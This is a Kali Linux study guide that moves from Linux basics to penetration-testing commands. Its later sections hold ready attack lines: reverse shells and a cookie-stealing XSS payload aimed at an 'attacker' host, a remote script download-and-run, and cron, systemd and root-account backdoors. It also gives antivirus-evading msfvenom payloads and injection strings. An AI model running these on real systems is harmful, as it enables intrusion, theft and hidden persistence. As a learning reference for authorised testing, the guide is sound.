---
seoTitle: Kali Linux Complete Guide – Penetration Testing, Tools & Commands
description: "Comprehensive Kali Linux reference covering installation, Linux fundamentals, shell commands, networking, user management, penetration testing tools, Metasploit, Nmap, Wireshark, Burp Suite, and ethical hacking workflows."
keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, Wireshark, Burp Suite, wireless security, security tools, cybersecurity, Linux commands, kali linux tutorial, kali linux guide, kali linux notes, VR-Rathod, Code-Note, code note vr, vr book"
---

- # History
  collapsed:: true
	- ## How
		- Kali Linux is a **Debian-based** Linux distribution developed and maintained by **Offensive Security**.
		- Successor to **BackTrack Linux** (discontinued 2013), which merged WHAX and Auditor Security Collection.
		- Kali Linux 1.0 released **March 13, 2013**, rebuilt on Debian from scratch.
		- Supports **600+ pre-installed security tools**. Follows a **rolling release** model.
	- ## Who
		- **Mati Aharoni** and **Devon Kearns** of Offensive Security — primary creators.
		- **Raphaël Hertzog** — Debian developer, core team member.
	- ## Why
		- BackTrack had architectural limitations and was hard to maintain.
		- Goal: FHS-compliant, properly packaged, enterprise-grade free platform for security professionals.
		- Used by: pentesters, CTF players, security researchers, law enforcement, students.

- # Introduction
  collapsed:: true
	- ## What is Kali Linux?
		- Security-focused Linux distro for: Penetration Testing, Digital Forensics, Reverse Engineering, Vulnerability Assessment, CTF.
	- ## Advantages
		- 600+ pre-installed tools, free & open-source, Debian-based, rolling release, multi-platform (x86, ARM, RPi, Android NetHunter, WSL2, Docker, cloud), live boot, customizable ISO.
	- ## Disadvantages
		- Not for daily use, steep learning curve, legal risk if misused, resource heavy (~20GB+), rolling release can occasionally break.
	- ## Kali Editions
		- ```
		  Kali Linux (Standard)  → Full desktop, all tools
		  Kali NetHunter         → Android mobile pentesting
		  Kali Linux ARM         → Raspberry Pi, Banana Pi
		  Kali Linux WSL         → Windows Subsystem for Linux
		  Kali Linux Docker      → docker pull kalilinux/kali-rolling
		  Kali Linux Cloud       → AWS, Azure, GCP images
		  Kali Linux Undercover  → Looks like Windows 10
		  ```

- # Installation & Setup
  collapsed:: true
	- ## System Requirements
		- ```
		  Minimum:  CPU 1GHz, RAM 1GB, Disk 20GB
		  Recommended: Multi-core 64-bit, RAM 4GB+, SSD 50GB+, Dedicated GPU
		  ```
	- ## Installation Methods
		- Bare metal, VirtualBox/VMware, Live USB, Persistent USB, WSL2 (`wsl --install -d kali-linux`), Docker (`docker pull kalilinux/kali-rolling`)
	- ## First Boot
		- ```bash
		  sudo apt update && sudo apt upgrade -y
		  sudo apt install kali-linux-everything   # all tools (~15GB)
		  sudo apt install kali-tools-top10        # top 10 only
		  sudo apt install kali-tools-web          # web testing
		  sudo apt install kali-tools-wireless     # wireless
		  sudo apt install kali-tools-forensics    # forensics
		  ```
	- ## Reset Root Password
		- ```
		  1. Restart → hold Shift → GRUB menu
		  2. Advanced options → recovery mode → press E
		  3. Find "ro" on linux line → change to "rw" → add: init=/bin/bash
		  4. Ctrl+X to boot
		  5. passwd root → enter new password
		  6. exec /sbin/init
		  ```

- # Kernel & Architecture
  collapsed:: true
	- ## What is the Kernel?
		- Core OS program with complete hardware control. Manages: processes, memory, device drivers, filesystem, system calls.
		- ```
		  Linux kernel → /boot/vmlinuz-<version>
		  Windows      → C:\Windows\System32\ntoskrnl.exe
		  macOS        → /System/Library/Kernels/kernel
		  ```
	- ## Kernel Types
		- ```
		  Monolithic (Linux)    → all in kernel space, fast, one bug = crash
		  Microkernel (Minix)   → minimal kernel, drivers in user space, stable, slower
		  Hybrid (Windows/macOS)→ mix of both
		  Exokernel (research)  → minimal, max app control over hardware
		  ```
	- ## Linux Boot Process
		- ```
		  Power On → BIOS/UEFI POST → GRUB2 bootloader
		  → Kernel decompresses → initramfs (early root fs)
		  → systemd (PID 1) starts services → Login prompt
		  ```
	- ## Linux File System Hierarchy (FHS)
		- ```
		  /           Root of entire filesystem
		  ├── /bin    Essential user binaries (ls, cp, mv, cat)
		  ├── /boot   Kernel + bootloader (vmlinuz, grub)
		  ├── /dev    Device files (hardware as files)
		  ├── /etc    System-wide config files
		  ├── /home   User home directories
		  ├── /lib    Shared libraries for /bin and /sbin
		  ├── /media  Auto-mount removable media (USB, CD)
		  ├── /mnt    Manual temporary mount point
		  ├── /opt    Optional/third-party software
		  ├── /proc   Virtual fs: process & kernel info
		  ├── /root   Root user home directory
		  ├── /run    Runtime data (PIDs, sockets) — cleared on reboot
		  ├── /sbin   System admin binaries (fdisk, iptables)
		  ├── /srv    Data served by system (web server files)
		  ├── /sys    Virtual fs: hardware/driver info
		  ├── /tmp    Temporary files (cleared on reboot)
		  ├── /usr    User programs, libraries, docs
		  │   ├── /usr/bin   Most user commands
		  │   ├── /usr/lib   Libraries for /usr/bin
		  │   └── /usr/share Architecture-independent data
		  └── /var    Variable data (logs, mail, databases)
		      ├── /var/log   System and app logs
		      └── /var/www   Web server document root
		  ```
	- ## Linux File Types
		- ```
		  -  Regular file       (text, binary, images, scripts)
		  d  Directory
		  l  Symbolic link      (shortcut to another file)
		  c  Character device   (keyboard, mouse, terminal)
		  b  Block device       (hard drives, USB drives)
		  s  Socket             (IPC network communication)
		  p  Named pipe (FIFO)  (IPC between processes)
		  ```

- # Shell & Terminal
  collapsed:: true
	- ## Shell Types
		- ```
		  sh   Bourne Shell    → original Unix shell, /bin/sh
		  bash Bourne Again    → default most Linux distros, $ prompt
		  zsh  Z Shell         → default Kali (since 2020), % prompt
		  fish Friendly Shell  → user-friendly, syntax highlighting
		  csh  C Shell         → C-like syntax
		  ksh  Korn Shell      → combines sh + csh
		  ```
	- ## File & Directory Commands
		- ```bash
		  pwd                        # print working directory
		  ls / ls -la / ls -lh       # list files / detailed / human sizes
		  cd /path  cd ~  cd ..  cd -# navigate
		  touch file.txt             # create file / update timestamp
		  touch file{1..5}.txt       # create file1.txt through file5.txt
		  mkdir dirname              # create directory
		  mkdir -p a/b/c             # create nested directories
		  cp source dest             # copy file
		  cp -r src/ dest/           # copy directory recursively
		  mv source dest             # move or rename
		  rm file.txt                # delete file
		  rm -rf dirname/            # delete directory (careful!)
		  ln -s target link          # create symbolic link
		  cat file.txt               # print file
		  less file.txt              # paginated view (q to quit)
		  head -n 20 file.txt        # first 20 lines
		  tail -n 20 file.txt        # last 20 lines
		  tail -f /var/log/syslog    # follow log live
		  file filename              # show file type
		  wc -l file.txt             # count lines
		  find / -name "*.conf"      # find by name
		  find /home -type f -size +1M  # files > 1MB
		  locate filename            # fast search (uses db)
		  which python3              # find executable location
		  whereis nmap               # find binary + man page
		  ```
	- ## File Permissions
		- ```
		  Format: -rwxrwxrwx  (owner group others)
		  r=4  w=2  x=1   →  7=rwx  6=rw-  5=r-x  4=r--  0=---

		  chmod 755 script.sh    # owner:rwx group:r-x others:r-x
		  chmod 644 file.txt     # owner:rw- group:r-- others:r--
		  chmod 600 id_rsa       # owner:rw- only (SSH key)
		  chmod +x script.sh     # add execute for all
		  chmod u+x script.sh    # add execute for owner only
		  chmod go-w file        # remove write from group+others
		  chown user file.txt           # change owner
		  chown user:group file.txt     # change owner and group
		  chown -R user:group dir/      # recursive
		  chmod u+s binary       # SUID: run as file owner
		  chmod g+s dir/         # SGID: new files inherit group
		  chmod +t /tmp          # Sticky bit: only owner deletes
		  ```
	- ## Text Editors
		- ```bash
		  nano file.txt          # beginner-friendly (Ctrl+O save, Ctrl+X exit)
		  vim file.txt           # powerful modal editor
		  # vim modes: Normal(default) Insert(i) Visual(v) Command(:)
		  # :w save  :q quit  :wq save+quit  :q! force quit
		  # dd delete line  yy copy line  p paste  /word search
		  ```
	- ## I/O Redirection & Pipes
		- ```bash
		  command > file.txt     # stdout to file (overwrite)
		  command >> file.txt    # stdout to file (append)
		  command 2> error.txt   # stderr to file
		  command 2>&1           # stderr to stdout
		  command &> file.txt    # both stdout+stderr
		  command < file.txt     # file as stdin
		  cmd1 | cmd2            # pipe stdout of cmd1 to cmd2
		  ls -la | grep ".sh"
		  cat /etc/passwd | cut -d: -f1 | sort
		  grep "pattern" file    # search pattern
		  grep -r "pattern" dir/ # recursive
		  grep -i -v -n          # case-insensitive / invert / line numbers
		  sort / sort -n         # alphabetical / numerical sort
		  uniq                   # remove duplicate adjacent lines
		  awk '{print $1}' file  # print first column
		  sed 's/old/new/g' file # replace all occurrences
		  cut -d: -f1 /etc/passwd# cut field 1 with : delimiter
		  tee file.txt           # write to file AND stdout
		  xargs                  # build commands from stdin
		  ```
	- ## Control Operators
		- ```bash
		  cmd1 ; cmd2      # run both regardless
		  cmd1 && cmd2     # run cmd2 only if cmd1 succeeds
		  cmd1 || cmd2     # run cmd2 only if cmd1 fails
		  cmd &            # run in background
		  apt update && apt upgrade -y
		  ping -c1 google.com || echo "No internet"
		  ```
	- ## Keyboard Shortcuts
		- ```
		  Ctrl+A/E   → start/end of line
		  Ctrl+W/U/K → delete word / to start / to end
		  Ctrl+R     → reverse search history
		  Ctrl+C     → cancel command
		  Ctrl+Z     → suspend (fg to resume)
		  Ctrl+L     → clear screen
		  Tab        → autocomplete
		  !!         → repeat last command
		  !string    → repeat last command starting with string
		  ```
	- ## Shell Scripting
		- ```bash
		  #!/bin/bash
		  name="Kali"
		  echo "Hello, $name"
		  read -p "Enter name: " username

		  if [ $age -ge 18 ]; then echo "Adult"
		  elif [ $age -ge 13 ]; then echo "Teen"
		  else echo "Child"; fi

		  for i in {1..5}; do echo $i; done

		  while [ $count -lt 10 ]; do echo $count; ((count++)); done

		  greet() { echo "Hello, $1"; }
		  greet "World"

		  command; if [ $? -eq 0 ]; then echo "OK"; else echo "Fail"; fi
		  ```

- # Process Management
  collapsed:: true
	- ## Viewing & Controlling Processes
		- ```bash
		  ps aux                 # all running processes
		  ps aux | grep nginx    # find specific process
		  top / htop             # real-time monitor
		  pgrep nginx            # get PID by name
		  pstree                 # process tree
		  kill PID               # SIGTERM (graceful)
		  kill -9 PID            # SIGKILL (force)
		  killall nginx          # kill all by name
		  pkill -f "python"      # kill by pattern
		  command &              # start in background
		  Ctrl+Z → bg            # suspend then background
		  fg                     # bring to foreground
		  jobs                   # list background jobs
		  nohup command &        # survive logout
		  ```
	- ## System Information
		- ```bash
		  uname -a               # kernel + system info
		  hostname               # system hostname
		  whoami / id            # current user / UID+GID
		  uptime                 # system uptime
		  df -h                  # disk space usage
		  du -sh /path           # directory size
		  free -h                # RAM + swap usage
		  lscpu                  # CPU info
		  lsblk                  # block devices
		  lsusb / lspci          # USB / PCI devices
		  cat /proc/cpuinfo      # detailed CPU
		  cat /proc/meminfo      # detailed memory
		  dmidecode              # hardware info from BIOS
		  ```

- # Systemd & Service Management
  collapsed:: true
	- ## systemctl
		- ```bash
		  systemctl start|stop|restart|reload nginx
		  systemctl enable|disable nginx    # boot behavior
		  systemctl status nginx            # status + recent logs
		  systemctl list-units --type=service --state=running
		  systemctl daemon-reload           # reload after editing unit files
		  ```
	- ## journalctl — Logs
		- ```bash
		  journalctl -f                     # follow live
		  journalctl -u nginx               # service logs
		  journalctl -b                     # since last boot
		  journalctl -p err                 # errors only
		  journalctl --since "1 hour ago"
		  journalctl -n 50                  # last 50 lines
		  journalctl --vacuum-time=7d       # delete old logs
		  ```
	- ## Important Log Files
		- ```
		  /var/log/auth.log      → SSH logins, sudo, authentication
		  /var/log/syslog        → general system messages
		  /var/log/kern.log      → kernel messages
		  /var/log/dpkg.log      → package install history
		  /var/log/apache2/      → web server logs
		  /var/log/fail2ban.log  → blocked IPs

		  grep "Failed password" /var/log/auth.log   # failed SSH
		  grep "Accepted" /var/log/auth.log           # successful SSH
		  last                   # login history
		  lastb                  # failed login attempts
		  lastlog                # last login all users
		  ```

- # User & Group Management
  collapsed:: true
	- ## User Commands
		- ```bash
		  adduser username               # interactive (home dir + password)
		  useradd -m -s /bin/bash user   # manual (with home + bash)
		  passwd username                # set password
		  usermod -aG sudo username      # add to sudo group
		  usermod -s /bin/zsh username   # change shell
		  userdel -r username            # delete user + home dir
		  su - username                  # switch user (load their env)
		  sudo -i                        # root shell
		  id username                    # show UID, GID, groups
		  who / w / last / lastb         # login info
		  ```
	- ## Important User Files
		- ```
		  /etc/passwd   → username:x:UID:GID:comment:home:shell
		  /etc/shadow   → encrypted passwords (root only)
		  /etc/group    → group definitions
		  /etc/sudoers  → sudo permissions (edit with: visudo)
		  ~/.bashrc     → user bash config
		  ~/.ssh/       → SSH keys
		  ```
	- ## Group Commands
		- ```bash
		  groupadd groupname             # create group
		  groupdel groupname             # delete group
		  usermod -aG group1,group2 user # add to groups
		  gpasswd -a user group          # add user to group
		  gpasswd -d user group          # remove from group
		  groups username                # show user's groups
		  ```

- # Package Management
  collapsed:: true
	- ## APT Commands
		- ```bash
		  apt update && apt upgrade -y   # refresh + upgrade all
		  apt full-upgrade -y            # upgrade + handle deps
		  apt install package            # install
		  apt remove package             # remove (keep config)
		  apt purge package              # remove + config
		  apt autoremove                 # remove unused deps
		  apt search keyword             # search packages
		  apt show package               # package details
		  dpkg -l | grep package         # check if installed
		  dpkg -i package.deb            # install .deb file
		  ```
	- ## Kali Metapackages
		- ```
		  kali-linux-core              minimal Kali
		  kali-linux-default           default install tools
		  kali-linux-everything        ALL tools (~15GB)
		  kali-tools-top10             top 10 tools
		  kali-tools-web               web app testing
		  kali-tools-wireless          wireless attacks
		  kali-tools-passwords         password attacks
		  kali-tools-exploitation      exploitation
		  kali-tools-forensics         forensics
		  kali-tools-reverse-engineering  RE tools
		  kali-tools-sniffing-spoofing    sniffing
		  kali-tools-social-engineering   SET etc
		  ```

- # Disk & Storage Management
  collapsed:: true
	- ## Disk Info & Partitioning
		- ```bash
		  lsblk / lsblk -f              # list block devices / with filesystems
		  fdisk -l                       # all disks and partitions
		  df -h                          # disk space usage
		  du -sh /* 2>/dev/null | sort -rh | head -20  # top 20 largest dirs
		  blkid                          # UUIDs and filesystem types
		  fdisk /dev/sdb                 # partition disk (MBR)
		  parted /dev/sdb                # partition disk (GPT+MBR)
		  mkfs.ext4 /dev/sdb1            # format as ext4
		  mkfs.vfat /dev/sdb1            # format as FAT32
		  ```
	- ## Mounting
		- ```bash
		  mount /dev/sdb1 /mnt           # mount partition
		  mount -o ro /dev/sdb1 /mnt     # read-only (forensics)
		  mount -o loop image.iso /mnt   # mount ISO
		  umount /mnt                    # unmount
		  # Auto-mount: add to /etc/fstab
		  # UUID=xxxx  /mnt/data  ext4  defaults  0  2
		  ```
	- ## Swap
		- ```bash
		  swapon --show / free -h        # show swap
		  dd if=/dev/zero of=/swapfile bs=1G count=4
		  chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile
		  echo '/swapfile none swap sw 0 0' >> /etc/fstab
		  ```

- # Networking
  collapsed:: true
	- ## Network Info
		- ```bash
		  ip a                           # all interfaces + IPs
		  ip route                       # routing table
		  hostname -I                    # all IP addresses
		  cat /etc/hosts                 # local DNS
		  cat /etc/resolv.conf           # DNS servers
		  ss -tulnp                      # listening ports + processes
		  lsof -i :80                    # what uses port 80
		  ```
	- ## Network Testing
		- ```bash
		  ping -c 4 192.168.1.1
		  traceroute google.com
		  mtr google.com                 # real-time traceroute
		  dig domain.com                 # DNS lookup
		  dig domain.com MX/NS/TXT/ANY   # specific records
		  dig axfr domain.com @ns1.domain.com  # zone transfer
		  curl -I https://example.com    # headers only
		  wget URL / wget -r URL         # download / recursive
		  ```
	- ## Network Configuration
		- ```bash
		  ip link set eth0 up/down
		  ip addr add 192.168.1.100/24 dev eth0
		  ip route add default via 192.168.1.1
		  nmcli device wifi list
		  nmcli device wifi connect "SSID" password "pass"
		  iwconfig / iwlist wlan0 scan   # wireless info / scan
		  ```
	- ## SSH
		- ```bash
		  ssh user@host                  # connect
		  ssh user@host -p 2222          # custom port
		  ssh -i ~/.ssh/id_rsa user@host # with key
		  ssh-keygen -t ed25519          # generate key (recommended)
		  ssh-copy-id user@host          # copy public key to host
		  ssh -L 8080:localhost:80 user@host   # local port forward
		  ssh -R 8080:localhost:80 user@host   # remote port forward
		  ssh -D 1080 user@host               # SOCKS proxy
		  systemctl start/enable ssh     # start SSH server
		  ```
	- ## Firewall
		- ```bash
		  iptables -L -n -v              # list rules
		  iptables -A INPUT -p tcp --dport 22 -j ACCEPT
		  iptables -A INPUT -j DROP      # drop all other input
		  iptables -F                    # flush all rules
		  ufw enable / ufw status
		  ufw allow 22 / ufw allow 80/tcp / ufw deny 23
		  ```

- # Penetration Testing Methodology
  collapsed:: true
	- ## Phases
		- ```
		  1. Reconnaissance    → Passive (OSINT, DNS, WHOIS) + Active (port scan)
		  2. Scanning          → Nmap, service enum, OS fingerprint, vuln scan
		  3. Exploitation      → Metasploit, manual exploits, custom scripts
		  4. Post-Exploitation → Privesc, lateral movement, persistence, exfil
		  5. Reporting         → Findings, severity, PoC, remediation
		  ```
	- ## Legal Rules
		- NEVER test without written permission. Get signed Rules of Engagement. Stay in scope. Practice on VulnHub, HackTheBox, TryHackMe.

- # Information Gathering
  collapsed:: true
	- ## Nmap
		- ```bash
		  nmap 192.168.1.0/24            # scan subnet
		  nmap -p- host                  # all 65535 ports
		  nmap -sS host                  # SYN scan (stealth)
		  nmap -sU host                  # UDP scan
		  nmap -sV host                  # service version
		  nmap -O host                   # OS detection
		  nmap -A host                   # aggressive (OS+version+scripts+traceroute)
		  nmap -sC host                  # default NSE scripts
		  nmap -T4 host                  # aggressive timing
		  nmap -oA output host           # save all formats
		  nmap --script=vuln host        # vulnerability scripts
		  nmap --script=smb-vuln* host   # SMB vulns
		  nmap --script=http-enum host   # web directory enum
		  nmap -D RND:10 host            # decoy scan (evasion)
		  nmap -f host                   # fragment packets
		  ```
	- ## WHOIS & DNS
		- ```bash
		  whois domain.com               # domain registration info
		  dig domain.com ANY             # all DNS records
		  dig axfr domain.com @ns1.domain.com  # zone transfer
		  dnsenum domain.com             # DNS enumeration
		  dnsrecon -d domain.com         # comprehensive DNS recon
		  fierce --domain domain.com     # subdomain brute force
		  ```
	- ## OSINT
		- ```bash
		  theHarvester -d domain.com -b all   # emails, subdomains, IPs
		  # Maltego: GUI OSINT, maps relationships between people/domains/IPs
		  # Shodan: search engine for internet-connected devices (shodan.io)
		  # Recon-ng: web reconnaissance framework
		  recon-ng                        # launch recon-ng
		  ```

- # Service Enumeration
  collapsed:: true
	- ## SMB / Samba
		- ```bash
		  nmap -p 445 --script smb-enum-shares,smb-enum-users target
		  nmap -p 445 --script smb-vuln* target
		  smbclient -L //target -N                    # list shares (no password)
		  smbclient //target/share -U admin%password  # connect with creds
		  enum4linux -a target                        # full SMB/LDAP enum
		  crackmapexec smb target -u user -p pass --shares
		  crackmapexec smb target -u user -p pass --sam   # dump SAM hashes
		  crackmapexec smb 192.168.1.0/24 -u user -p pass # spray subnet
		  ```
	- ## FTP / SNMP / LDAP / NFS
		- ```bash
		  # FTP (port 21)
		  nmap -p 21 --script ftp-anon target
		  ftp target                     # anonymous: user=anonymous pass=email
		  hydra -l admin -P rockyou.txt ftp://target

		  # SNMP (UDP 161)
		  nmap -sU -p 161 --script snmp-info,snmp-brute target
		  snmpwalk -c public -v2c target
		  onesixtyone -c community-strings.txt target

		  # LDAP (port 389)
		  nmap -p 389 --script ldap-search target
		  ldapsearch -x -H ldap://target -b "dc=domain,dc=com"

		  # NFS (port 2049)
		  showmount -e target            # show NFS exports
		  mount -t nfs target:/share /mnt/nfs

		  # MySQL (3306) / MSSQL (1433)
		  nmap -p 3306 --script mysql-info,mysql-enum target
		  mysql -h target -u root -p
		  nmap -p 1433 --script ms-sql-info target
		  impacket-mssqlclient sa:password@target
		  ```

- # Vulnerability Scanning
  collapsed:: true
	- ## Nikto & OpenVAS
		- ```bash
		  nikto -h http://target.com                  # web server scan
		  nikto -h http://target.com -ssl -p 8443     # HTTPS custom port
		  nikto -h http://target.com -o report.html -Format html

		  apt install gvm && gvm-setup && gvm-start   # OpenVAS setup
		  # Web UI: https://127.0.0.1:9392
		  ```
	- ## Searchsploit
		- ```bash
		  searchsploit apache 2.4
		  searchsploit -t "remote code execution"
		  searchsploit -x 12345          # examine exploit
		  searchsploit -m 12345          # copy to current dir
		  searchsploit --update          # update database
		  ```

- # Exploitation Tools
  collapsed:: true
	- ## Metasploit Framework
		- ```bash
		  msfconsole                     # launch
		  systemctl start postgresql && msfdb init  # setup DB
		  search eternalblue             # search modules
		  use exploit/windows/smb/ms17_010_eternalblue
		  show options
		  set RHOSTS 192.168.1.10
		  set LHOST 192.168.1.5
		  set LPORT 4444
		  set PAYLOAD windows/x64/meterpreter/reverse_tcp
		  check / run

		  # Meterpreter post-exploitation
		  sysinfo / getuid / getsystem   # info / user / privesc
		  hashdump                       # dump password hashes
		  shell                          # system shell
		  upload /path/file              # upload to target
		  download file /local/          # download from target
		  screenshot / keyscan_start / keyscan_dump
		  run post/multi/recon/local_exploit_suggester
		  background                     # background session
		  sessions -l / sessions -i 1    # list / interact
		  use auxiliary/scanner/smb/smb_version
		  ```
	- ## MSFvenom Payloads
		- ```bash
		  # Windows reverse shell
		  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe -o shell.exe
		  # Linux ELF
		  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f elf -o shell.elf
		  # PHP webshell
		  msfvenom -p php/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f raw -o shell.php
		  # Encoded (AV evasion)
		  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe
		  ```

- # Password Attacks
  collapsed:: true
	- ## John the Ripper
		- ```bash
		  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
		  john --rules hashes.txt        # with mangling rules
		  john --show hashes.txt         # show cracked
		  unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt
		  zip2john archive.zip > zip.hash && john zip.hash
		  ssh2john id_rsa > ssh.hash && john ssh.hash
		  ```
	- ## Hashcat (GPU)
		- ```bash
		  # -m: 0=MD5 100=SHA1 1000=NTLM 1800=sha512crypt 3200=bcrypt
		  hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
		  hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a   # brute force 6 chars
		  hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
		  hashcat -m 0 hash.txt --show
		  ```
	- ## Hydra (Online Brute Force)
		- ```bash
		  hydra -l root -P rockyou.txt ssh://192.168.1.10
		  hydra -l admin -P passwords.txt ftp://192.168.1.10
		  hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
		  hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4 -V -f
		  ```
	- ## Wordlists
		- ```bash
		  ls /usr/share/wordlists/
		  gunzip /usr/share/wordlists/rockyou.txt.gz   # 14M passwords
		  crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
		  cewl http://target.com -w wordlist.txt        # scrape site for words
		  ```

- # Web Application Testing
  collapsed:: true
	- ## Burp Suite
		- ```
		  Launch: burpsuite
		  Setup: browser proxy → 127.0.0.1:8080 → install Burp CA cert
		  Proxy    → intercept + modify HTTP/HTTPS traffic
		  Repeater → manually resend + modify requests
		  Intruder → automated brute force / fuzzing
		  Decoder  → Base64, URL, HTML encode/decode
		  Comparer → diff two requests/responses
		  Workflow: Intercept → Send to Repeater → modify → analyze
		  ```
	- ## SQLMap
		- ```bash
		  sqlmap -u "http://target.com/page?id=1"
		  sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
		  sqlmap -u "http://target.com/page?id=1" --cookie="session=abc"
		  sqlmap -u "http://target.com/page?id=1" --dbs          # list DBs
		  sqlmap -u "http://target.com/page?id=1" -D db --tables # list tables
		  sqlmap -u "http://target.com/page?id=1" -D db -T users --dump
		  sqlmap -u "http://target.com/page?id=1" --os-shell
		  sqlmap ... --level=5 --risk=3 --batch --tor
		  ```
	- ## Directory Enumeration
		- ```bash
		  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
		  gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
		  gobuster dns -d domain.com -w subdomains.txt
		  dirb http://target.com
		  feroxbuster -u http://target.com -w wordlist.txt   # recursive
		  ```
	- ## Web Vulnerabilities (Manual)
		- ```
		  SQL Injection:
		    '  ''  ' OR 1=1--  admin'--  ' UNION SELECT NULL,NULL--
		    Time-based: ' AND SLEEP(5)--

		  XSS:
		    <script>alert(1)</script>
		    <img src=x onerror=alert(1)>
		    <svg onload=alert(1)>
		    Cookie steal: <script>document.location='http://attacker/?c='+document.cookie</script>

		  LFI:
		    ?page=../../../../etc/passwd
		    ?page=php://filter/convert.base64-encode/resource=index.php
		    Log poisoning: inject PHP in User-Agent → include log file

		  Command Injection:
		    ; id   | id   && id   `id`   $(id)
		    Blind: ; sleep 5   ; ping -c5 attacker.com

		  SSRF:
		    url=http://127.0.0.1/
		    url=http://169.254.169.254/latest/meta-data/  (AWS)

		  XXE:
		    <?xml version="1.0"?>
		    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
		    <root>&xxe;</root>
		  ```

- # Network Sniffing & Analysis
  collapsed:: true
	- ## Wireshark
		- ```
		  Launch: wireshark
		  Display filters:
		    ip.addr == 192.168.1.1
		    tcp.port == 80
		    http / dns / ftp
		    http.request.method == "POST"
		    frame contains "password"
		  Capture filters:
		    host 192.168.1.1 / port 80 / not arp
		  Follow TCP stream → right-click packet → Follow → TCP Stream
		  ```
	- ## tcpdump
		- ```bash
		  tcpdump -i eth0 -w capture.pcap    # capture to file
		  tcpdump -r capture.pcap            # read file
		  tcpdump -i eth0 port 80            # filter port
		  tcpdump -i eth0 host 192.168.1.1   # filter host
		  tcpdump -i eth0 -X                 # hex+ASCII output
		  tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN packets
		  ```
	- ## Netcat — Swiss Army Knife
		- ```bash
		  nc -zv 192.168.1.1 1-1000          # port scan
		  nc -lvp 4444                        # listen on port
		  # Reverse shell listener:
		  nc -lvp 4444
		  # Victim Linux: bash -i >& /dev/tcp/attacker/4444 0>&1
		  # Victim nc:    nc attacker 4444 -e /bin/bash
		  # File transfer: nc -lvp 4444 > file  |  nc host 4444 < file
		  ```

- # Wireless Security
  collapsed:: true
	- ## Aircrack-ng Suite
		- ```bash
		  airmon-ng                          # list wireless interfaces
		  airmon-ng check kill               # kill interfering processes
		  airmon-ng start wlan0              # enable monitor mode → wlan0mon
		  airodump-ng wlan0mon               # scan all networks
		  airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
		  aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon  # deauth → capture handshake
		  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
		  airmon-ng stop wlan0mon            # disable monitor mode
		  ```
	- ## WPS Attacks
		- ```bash
		  wash -i wlan0mon                   # scan for WPS-enabled APs
		  reaver -i wlan0mon -b AP_MAC -vv   # WPS PIN brute force
		  bully -b AP_MAC -e ESSID -c CH wlan0mon  # alternative to reaver
		  ```
	- ## Evil Twin / Rogue AP
		- ```bash
		  # hostapd-wpe: rogue AP for capturing WPA Enterprise credentials
		  apt install hostapd-wpe
		  # Configure hostapd-wpe.conf with SSID matching target
		  hostapd-wpe hostapd-wpe.conf
		  ```

- # Privilege Escalation
  collapsed:: true
	- ## Linux PrivEsc
		- ```bash
		  id && sudo -l                  # current user + sudo perms
		  find / -perm -u=s -type f 2>/dev/null   # SUID binaries → GTFOBins
		  find / -writable -type f 2>/dev/null | grep -v proc
		  cat /etc/crontab && ls -la /etc/cron.*  # cron jobs
		  uname -a                       # kernel version → searchsploit
		  # Automated: LinPEAS
		  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
		  ```
	- ## Windows PrivEsc (from Kali)
		- ```bash
		  whoami /priv && whoami /groups  # privileges + groups
		  systeminfo                      # OS + patch level
		  # Unquoted service paths:
		  wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
		  # AlwaysInstallElevated:
		  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
		  # Stored creds:
		  cmdkey /list
		  reg query HKLM /f password /t REG_SZ /s
		  # Automated: WinPEAS
		  IEX(New-Object Net.WebClient).downloadString('http://attacker/winPEAS.ps1')
		  ```

- # Post-Exploitation & Persistence
  collapsed:: true
	- ## Linux Persistence
		- ```bash
		  # Cron backdoor
		  (crontab -l; echo "* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1") | crontab -
		  # Add SSH key
		  echo "ssh-rsa AAAA...pubkey..." >> ~/.ssh/authorized_keys
		  # Add root user
		  echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd
		  # SUID shell
		  cp /bin/bash /tmp/.bash && chmod u+s /tmp/.bash && /tmp/.bash -p
		  # Systemd service
		  cat > /etc/systemd/system/backdoor.service << EOF
		  [Unit]
		  Description=System Service
		  [Service]
		  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
		  Restart=always
		  [Install]
		  WantedBy=multi-user.target
		  EOF
		  systemctl enable backdoor && systemctl start backdoor
		  ```
	- ## Lateral Movement
		- ```bash
		  # Pass-the-Hash
		  impacket-psexec -hashes :NTLM_HASH administrator@target
		  crackmapexec smb target -u admin -H NTLM_HASH --exec-method smbexec
		  # Pass-the-Ticket (Kerberos)
		  impacket-getTGT domain/user:password
		  export KRB5CCNAME=user.ccache
		  impacket-psexec -k -no-pass domain/user@target
		  # Spray credentials across subnet
		  crackmapexec smb 192.168.1.0/24 -u admin -p password
		  ```
	- ## Pivoting & Tunneling
		- ```bash
